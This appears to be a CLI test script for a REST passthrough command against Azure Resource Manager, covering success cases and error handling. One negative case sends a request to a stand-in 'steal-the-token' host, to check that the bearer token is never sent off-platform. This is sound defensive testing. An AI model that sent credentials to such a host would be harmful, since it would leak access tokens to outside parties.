# Universal REST passthrough - CLI
# Equivalent of: az rest --method GET --uri <url>
#
# Prereq: azv2 login (so the {subscriptionId} token and ARM auth resolve).

# Happy path: relative ARM path. {subscriptionId} is substituted from the auth context,
# the ARM endpoint (https://management.azure.com) is prepended, and the request is
# authenticated automatically. Expect HTTP 200 + a JSON list of resource groups.
rest `
    --method GET `
    --uri "/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01"

# Happy path: absolute URL passes through unchanged (still ARM-authenticated).
rest `
    --method GET `
    --uri "https://management.azure.com/subscriptions/282bb33f-067d-4179-a7a4-b833c13af735/resourcegroups/cirrus-test-group-1?api-version=2021-04-01"

# Happy path with explicit headers (space-separated KEY=VALUE).
rest `
    --method GET `
    --uri "/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01" `
    --headers Accept=application/json

# Negative case: an unsupported HTTP method must be rejected with a clear message.
rest `
    --method FOO `
    --uri "/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01"

# Negative case: an HTTP error (>= 400) must surface the body AND cause a non-zero CLI exit so
# scripts using set -e / $? can detect it. This GET targets a resource group that does not exist
# and is expected to return 404; the full RestResponse (status/headers/body) is still printed.
rest `
    --method GET `
    --uri "/subscriptions/{subscriptionId}/resourcegroups/this-rg-does-not-exist-404?api-version=2021-04-01"

# Negative case: an absolute URL pointing at a non-ARM host must be REJECTED before any request is
# sent, so the ARM bearer token is never leaked to an arbitrary destination (token exfiltration).
rest `
    --method GET `
    --uri "https://example.com/steal-the-token"

# Negative case: an absolute http:// (non-https) ARM URL must be rejected.
rest `
    --method GET `
    --uri "http://management.azure.com/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01"
